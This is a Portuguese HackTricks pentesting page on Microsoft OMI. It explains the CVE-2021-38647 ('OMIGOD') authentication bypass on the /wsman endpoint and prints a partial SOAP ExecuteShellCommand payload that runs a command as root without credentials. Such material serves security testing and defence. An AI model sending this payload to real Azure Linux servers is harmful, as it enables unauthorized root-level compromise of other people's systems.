# 5985,5986 - Pentesting OMI

{{#include ../banners/hacktricks-training.md}}

### **Informações Básicas**

**OMI** é apresentado como uma **[ferramenta de código aberto](https://github.com/microsoft/omi)** pela Microsoft, projetada para gerenciamento de configuração remota. É particularmente relevante para servidores Linux no Azure que utilizam serviços como:

- **Azure Automation**
- **Azure Automatic Update**
- **Azure Operations Management Suite**
- **Azure Log Analytics**
- **Azure Configuration Management**
- **Azure Diagnostics**

O processo `omiengine` é iniciado e escuta em todas as interfaces como root quando esses serviços são ativados.

**As portas padrão** utilizadas são **5985** (http) e **5986** (https).

### **[Vulnerabilidade CVE-2021-38647](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)**

Como observado em 16 de setembro, servidores Linux implantados no Azure com os serviços mencionados são suscetíveis devido a uma versão vulnerável do OMI. Essa vulnerabilidade reside no manuseio de mensagens do servidor OMI através do endpoint `/wsman` sem exigir um cabeçalho de Autenticação, autorizando incorretamente o cliente.

Um atacante pode explorar isso enviando um payload SOAP "ExecuteShellCommand" sem um cabeçalho de Autenticação, forçando o servidor a executar comandos com privilégios de root.
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
Para mais informações sobre este CVE **[verifique isso](https://github.com/horizon3ai/CVE-2021-38647)**.

## Referências

- [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
- [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

{{#include ../banners/hacktricks-training.md}}
